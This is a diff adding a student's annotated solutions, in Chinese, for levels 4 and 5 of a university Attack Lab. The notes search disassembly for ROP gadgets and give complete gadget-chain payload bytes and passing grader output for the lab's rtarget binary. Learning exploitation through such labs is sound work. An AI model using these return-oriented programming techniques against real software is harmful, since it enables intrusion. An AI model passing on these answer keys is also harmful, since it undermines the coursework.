@@ -128,3 +128,179 @@ PASS: Would have posted the following:
         lab     attacklab
         result  1:PASS:0xffffffff:ctarget:3:5F C3 35 39 62 39 39 37 66 61 00 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 7A DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
 
+# Level 4
+
+# 这里要求使用Garget重复level_2的操作
+# 将cookie存到rdi寄存器，然后调用函数touch2
+
+# rtarget touch2
+
+00000000004017ec <touch2>:
+
+# 反编译rtarget看看
+# 找一找有没有pop %rdi的5f
+# 并不能找到
+# 换其他寄存器
+# 试一试包含空指令90呢
+# 找到了
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3  
+
+# 58 是 popq %rax
+# 90 是 nop
+# c3 是 ret
+
+# 找一找有没有movq/l %rax, %rdi的
+
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3  
+
+# 完美符合movq %rax, %rdi
+# 48 89 c7
+
+# 拼凑字节
+
+/* 填缓存区 */
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+/* addval_219 */
+/* 0x4019ab */
+ab 19 40 00 00 00 00 00
+/* cookie */
+fa 97 b9 59 00 00 00 00
+/* setval_426 */
+/* 0x4019c5 */
+c5 19 40 00 00 00 00 00
+/* touch2 */
+ec 17 40 00 00 00 00 00
+
+# 一次通过！
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+
+# Level 5
+
+# 首先一个大问题，如何返回填写在缓冲区中的ASCII Cookie?
+# 35 39 62 39 39 37 66 61 00
+# 唯一的办法似乎只能通过rsp
+# 通过rsp加减偏移量得到
+# 没有add和sub指令，只能leaq
+
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	ret
+
+# 完美指令，涉及rax,rdi,rsi
+
+# 一个一个找太费事了，直接从网上找所有能用的吧
+
+# 执行popq %rax
+# 0x4019ab
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3  
+# 58
+
+# 执行movq %rax, %rdi
+# 0x4019c5
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3  
+# 48 89 c7
+
+# 执行lea    (%rdi,%rsi,1),%rax
+# 0x4019d6
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	ret
+
+# 执行movq %rsp, %rax
+# 0x401aad
+0000000000401aab <setval_350>:
+  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
+  401ab1:	c3                   	ret
+# 48 89 e0
+
+# 执行movl %eax, %edx
+# 0x4019dd
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3  
+# 89 c2
+
+# 先movl %edx, %ecx
+# 再交换两者(91)等于没交换
+# 0x401a70
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	ret
+# 89 d1
+
+# 执行movl %ecx, %esi
+# 0x401a13
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	ret
+# 89 ce
+
+
+# 加载rsp
+movq %rsp, %rax
+movq %rax, %rdi
+# 加载偏移量esi
+popq %rax
+movl %eax, %edx
+movl %edx, %ecx
+movl %ecx, %esi
+# 加载绝对地址，填入参数
+lea (%rdi, %rsi, 1) %rax
+movq %rax, %rdi
+# 叫touch3
+
+/* buffer */
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+/* movq %rsp, %rax */
+ad 1a 40 00 00 00 00 00
+/* movq %rax, %rdi */
+c5 19 40 00 00 00 00 00
+/* popq %rax */
+ab 19 40 00 00 00 00 00
+/* 偏移量 9 * 8 = 72 = 0x48 */
+48 00 00 00 00 00 00 00
+/* movl %eax, %edx */
+dd 19 40 00 00 00 00 00
+/* movl %edx, %ecx */
+70 1a 40 00 00 00 00 00
+/* movl %ecx, %esi */
+13 1a 40 00 00 00 00 00
+/* lea (%rdi, %rsi, 1) %rax */
+d6 19 40 00 00 00 00 00
+/* movq %rax, %rdi */
+c5 19 40 00 00 00 00 00
+/* touch3 */
+/* 00000000004018fa */
+fa 18 40 00 00 00 00 00
+/* ASCII */
+35 39 62 39 39 37 66 61
+
+# 一次成功！！！太开心了！！！
+
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 AD 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
+
+# FINISH
